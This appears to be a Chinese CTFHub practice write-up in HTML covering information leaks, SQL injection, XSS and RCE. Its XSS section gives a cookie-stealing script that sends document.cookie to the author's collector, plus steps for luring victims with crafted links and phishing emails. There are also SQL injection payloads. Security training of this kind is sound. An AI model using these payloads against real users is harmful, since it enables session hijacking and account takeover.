@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="title: ctfhub刷题心得date: 2023-9-25 21:56:41tags: [ctfhub, ctf]categories: [ctfhhub刷题] 1. web1. 前置技能1. http协议1. 请求方式HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="yuanmouensis313&#39;s blog">
+<meta property="og:url" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/index.html">
+<meta property="og:site_name" content="yuanmouensis313&#39;s blog">
+<meta property="og:description" content="title: ctfhub刷题心得date: 2023-9-25 21:56:41tags: [ctfhub, ctf]categories: [ctfhhub刷题] 1. web1. 前置技能1. http协议1. 请求方式HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230722195004196.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724101810666.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724141207580.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724141119351.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724142806792.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724142857455.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724143057762.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195417378.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195508562.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195745003.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/Users/AJNUY/AppData/Roaming/Typora/typora-user-images/image-20230818175801011.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818175838535.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818175917767.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818180011029.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905161224097.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905161446056.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905162137980.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905162352302.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164534416.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164602319.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164723651.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164802046.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912103927339.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912111214367.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112103953.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112120798-16955380701701.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112714652.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112742766.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912114803016.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913094235230.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913094431205.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913104311058.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913104359762.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913141710717.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913141928238.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913142247986.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913142601768.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913143918669.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913144015186.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913144137007.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913145850858.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913145952945.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151042475.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151535192.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151718585.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913201824609.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913204053560.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205211049.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205255854.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205530535-16955381276002.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205740556.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205803285.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917104920370.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105031724.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105323709.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105537086.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105714104.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230918134059991.png">
+<meta property="og:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230918134028668.png">
+<meta property="article:published_time" content="2023-10-13T08:29:12.490Z">
+<meta property="article:modified_time" content="2023-10-13T07:16:46.076Z">
+<meta property="article:author" content="yuanmouensis">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230722195004196.png">
+
+<link rel="canonical" href="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title> | yuanmouensis313's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">yuanmouensis313's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yuanmouensis">
+      <meta itemprop="description" content="here is yuanmouensis313's blog">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yuanmouensis313's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-10-13 16:29:12 / Modified: 15:16:46" itemprop="dateCreated datePublished" datetime="2023-10-13T16:29:12+08:00">2023-10-13</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>title: ctfhub刷题心得<br>date: 2023-9-25 21:56:41<br>tags: [ctfhub, ctf]<br>categories: [ctfhhub刷题]</p>
+<h1 id="1-web"><a href="#1-web" class="headerlink" title="1. web"></a>1. web</h1><h2 id="1-前置技能"><a href="#1-前置技能" class="headerlink" title="1. 前置技能"></a>1. 前置技能</h2><h3 id="1-http协议"><a href="#1-http协议" class="headerlink" title="1. http协议"></a>1. http协议</h3><h4 id="1-请求方式"><a href="#1-请求方式" class="headerlink" title="1. 请求方式"></a>1. 请求方式</h4><p>HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p>
+<span id="more"></span>
+
+
+
+<h4 id="2-302跳转"><a href="#2-302跳转" class="headerlink" title="2. 302跳转"></a>2. 302跳转</h4><p>301跳转是指页面永久性移走(永久跳转)，通常叫做301跳转，也叫 301重定向 ，301转向。301跳转多用于旧网址在废弃前转向新网址以保证用户的访问，在诸多服务器中，均支持本跳转方法。</p>
+<p>302重定向又称之为暂时性转移(临时跳转)，英文名称：302 redirect。 也被认为是暂时重定向 ，一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。</p>
+<ul>
+<li>比如一个portal页面，换了新的域名，但是老的域名地址还有很多用户在使用，这样可以对老域名配置302跳转到新域名地址，保证服务的延续。</li>
+<li>另外对于一些客户端预埋的Url链接，免不了老版本地址失效与更改，将老地址配置302跳转到新地址，这样就能够全面兼容所有客户端版本。</li>
+</ul>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230722195004196.png" alt="image-20230722195004196"></p>
+<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><h1 id="2-信息泄露"><a href="#2-信息泄露" class="headerlink" title="2. 信息泄露"></a>2. 信息泄露</h1><h2 id="1-目录遍历"><a href="#1-目录遍历" class="headerlink" title="1. 目录遍历"></a>1. 目录遍历</h2><h2 id="2-phpinfo"><a href="#2-phpinfo" class="headerlink" title="2. phpinfo"></a>2. phpinfo</h2><h2 id="3-备份文件下载"><a href="#3-备份文件下载" class="headerlink" title="3. 备份文件下载"></a>3. 备份文件下载</h2><h3 id="1-网站源码"><a href="#1-网站源码" class="headerlink" title="1. 网站源码"></a>1. 网站源码</h3><h3 id="2-bak文件"><a href="#2-bak文件" class="headerlink" title="2. bak文件"></a>2. bak文件</h3><h3 id="3-vim缓存"><a href="#3-vim缓存" class="headerlink" title="3. vim缓存"></a>3. vim缓存</h3><p>当我们使用vim或者vi编辑文件时，出现不正常的情况（多个程序编辑同一个文件），系统会产生一个.(flilename).swp文件，我们在网站中访问该文件，便可以拿到网站的源码</p>
+<h3 id="4-DS-Store"><a href="#4-DS-Store" class="headerlink" title="4. .DS_Store"></a>4. .DS_Store</h3><h3 id="4-git"><a href="#4-git" class="headerlink" title="4. git"></a>4. git</h3><h4 id="1-log"><a href="#1-log" class="headerlink" title="1. log"></a>1. log</h4><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724101810666.png" alt="image-20230724101810666"></p>
+<p>没做出来，呜呜呜</p>
+<h3 id="5-svn泄露"><a href="#5-svn泄露" class="headerlink" title="5. svn泄露"></a>5. svn泄露</h3><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
+<p>我们也需要使用一个工具来利用svn泄露——dvcs-ripper，安装教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Barlow_121212/article/details/120491567">(22条消息) dvcs-ripper安装教程_海滩丨长颈鹿的博客-CSDN博客</a></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724141207580.png" alt="image-20230724141207580"></p>
+<p>执行命令</p>
+<img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724141119351.png" alt="image-20230724141119351" style="zoom:150%;">
+
+<p>查看到flag</p>
+<h3 id="6-hg泄露"><a href="#6-hg泄露" class="headerlink" title="6. hg泄露"></a>6. hg泄露</h3><p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞</p>
+<img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724142806792.png" alt="image-20230724142806792" style="zoom:150%;">
+
+<p>执行命令</p>
+<img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724142857455.png" alt="image-20230724142857455" style="zoom:150%;">
+
+<p>找到一个类似的flag文件，但是我在下载下的文件夹里翻半天也没发现，那我直接尝试使用该文件直接在网站访问</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724143057762.png" alt="image-20230724143057762"></p>
+<p>成功找到</p>
+<h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3. SQL注入"></a>3. SQL注入</h2><h3 id="1-整数型注入"><a href="#1-整数型注入" class="headerlink" title="1. 整数型注入"></a>1. 整数型注入</h3><p>除了手工注入外，我们还可以使用sqlmap这个渗透工具。<a target="_blank" rel="noopener" href="https://sqlmap.org/">sqlmap是一款开源的渗透测试工具，它可以自动化地检测和利用SQL注入漏洞，从而获取数据库服务器的控制权。</a>通过具体的使用，其使用确实要比手工注入要更方便快捷，使用–current-db，–tables，–columns等几个命令便可以较为简单的拿到数据库的有关信息。</p>
+<p>在手工注入中，我们需要知道几个信息，MySQL的数据库中一般都会有一个information_schema这样的一个数据库，其中一般都会存放一些关于mysql数据库的相关信息。我们可以从其中的tables，columns表中找到我们想要的表名和列名。</p>
+<p>在进行sql注入时，一般的步骤都是：</p>
+<p>①判断注入点：比如我们可以在填写的信息后添加上” and 1 &#x3D; 1”这样的条件进行判断是否存在注入点。</p>
+<p>②判断列数：我们可以使用“order by number”来判断到底有几列。</p>
+<p>③拿到数据库名：sqlmap我们可以使用命令–current-db，而手工注入就要使用联合查询和database()函数。</p>
+<p>④拿到表名：sqlmap可以使用–tables命令，手工注入使用联合查询从information_schema.tables这张表中拿到表名。</p>
+<p>⑤拿到列名：sqlmap可以使用–columns命令，手工注入使用联合查询从information_schema.columns表中拿到列名。</p>
+<p>⑥从想要的表中拿到数据：根据上述拿到的数据库名，表名，列名拿到数据。</p>
+<h3 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2. 字符型注入"></a>2. 字符型注入</h3><p>对于字符串注入，当我们注入的值为1时，其运行的代码是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们输入的内容被一串字符串包裹起来了，那么，我可以使用一些特殊字符串将其绕过。</p>
+<p>我们可以输入 1’ order by 2;#，这样的输入，1后面的引号可以使得自带的前一个引号闭合，在语句的最后加上#，也就是将后面的内容注释掉，不会再执行这样的内容。</p>
+<p>最后的执行代码是，</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3. 报错注入"></a>3. 报错注入</h3><p>主要使用一个updatexml()这样的一个方法。</p>
+<p><strong>updatexml（）函数</strong></p>
+<ul>
+<li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li>
+<li>作用：改变文档中符合条件的节点的值</li>
+<li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li>
+<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195417378.png" alt="image-20230807195417378"></p>
+<p>当我们输入1时，没有任何问题，成功查询</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195508562.png" alt="image-20230807195508562"></p>
+<p>出现报错信息，可以使用报错注入</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195745003.png" alt="image-20230807195745003"></p>
+<p>拿到了数据库的名称</p>
+<h1 id="4-XSS"><a href="#4-XSS" class="headerlink" title="4. XSS"></a>4. XSS</h1><p>1、明确cookie的作用<br>当你登录账号密码，服务端就会给你一个cookie，这样你在这个平台上的操作就带上了cookie来验证身份，而不用每一次操作都要你登录账号密码。cookie相当于每个人的登录凭证，如果得到了别人的cookie，特别是管理员的，我们将可以不用输账号密码，直接登录，从而获取管理员权限。</p>
+<p>2、XSS的目的<br>获取别人的cookie。<br>Web渗透测试之XSS攻击：反射型XSS</p>
+<p>获得cookie的方法：我们在有XSS漏洞的搜索栏中输入<script>alert(document.cookie)< /script>，但cookie只会在受害用户的浏览器中弹出，我们无法获得。</p>
+<p>那该怎么办呢？</p>
+<p>①在存在XSS漏洞的地方加上XSS：<script src=“<a target="_blank" rel="noopener" href="http://127.0.0.1/xss/UYxzH8?1608472710/%E2%80%9D">http://127.0.0.1/xss/UYxzH8?1608472710/”</a> + document.cookie;> </script> (<a target="_blank" rel="noopener" href="http://127.0.0.1/xss/UYxzH8?1608472710/">http://127.0.0.1/xss/UYxzH8?1608472710/</a> 为我们搭建的XSS平台)。</p>
+<p>②接着构造虚假URL诱使受害用户点击：<a target="_blank" rel="noopener" href="http://xxx/xx?abc=">http://xxx/xx?abc=</a>&lt;script src&#x3D;”<a target="_blank" rel="noopener" href="http://127.0.0.1/xss/UYxzH8?1608472710/%E2%80%9D+document.cookie;%3E">http://127.0.0.1/xss/UYxzH8?1608472710/”+document.cookie;&gt;</a> 。就像上面那个蓝字链接，我诱使你们点击，然后你们的浏览器就会请求蓝字背后的链接。如果我把蓝字背后的链接换成<a target="_blank" rel="noopener" href="http://xxx/xx?abc=">http://xxx/xx?abc=</a>&lt;script src&#x3D;”<a target="_blank" rel="noopener" href="http://127.0.0.1/xss/UYxzH8?1608472710/%E2%80%9D+document.cookie;%3E">http://127.0.0.1/xss/UYxzH8?1608472710/”+document.cookie;&gt;</a> ，在你们点击后，你们的浏览器就会带上你们的cookie，访问<a target="_blank" rel="noopener" href="http://127.0.0.1/xss/UYxzH8?1608472710/%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%9C%A8%E6%88%91%E6%89%80%E6%90%AD%E5%BB%BA%E7%9A%84%E5%B9%B3%E5%8F%B0%E6%97%A5%E5%BF%97%E4%B8%8A%E7%95%99%E4%B8%8B%E4%BD%A0%E4%BB%AC%E7%9A%84cookie%E3%80%82">http://127.0.0.1/xss/UYxzH8?1608472710/，从而在我所搭建的平台日志上留下你们的cookie。</a></p>
+<p>③在用户点击后，只需查看我们所搭建平台的日志即可获得受害用户的cookie。在获得cookie之后就可以利用抓包工具修改请求包中的cookie，将其替换为受害用户的cookie即可登录受害用户的账号。而诱使用户点击虚假URL的方式有很多，如钓鱼邮件、特殊的图片或文本等。</p>
+<h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1. 反射型"></a>1. 反射型</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/Users\AJNUY\AppData\Roaming\Typora\typora-user-images\image-20230818175801011.png" alt="image-20230818175801011"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818175838535.png" alt="image-20230818175838535"></p>
+<p>获取XSS反射代码</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818175917767.png" alt="image-20230818175917767"></p>
+<p>访问到xss代码</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818180011029.png" alt="image-20230818180011029"></p>
+<p>获取到flag</p>
+<h1 id="5-RCE"><a href="#5-RCE" class="headerlink" title="5. RCE"></a>5. RCE</h1><h3 id="1-eval执行"><a href="#1-eval执行" class="headerlink" title="1. eval执行"></a>1. eval执行</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905161224097.png" alt="image-20230905161224097"></p>
+<p>题目给出了php的代码，PHP代码显示，要求<strong>将命令赋值给cmd然后执行</strong></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905161446056.png" alt="image-20230905161446056"></p>
+<p><strong>cmd命令的格式一点不能错，后面的分号不能省略</strong></p>
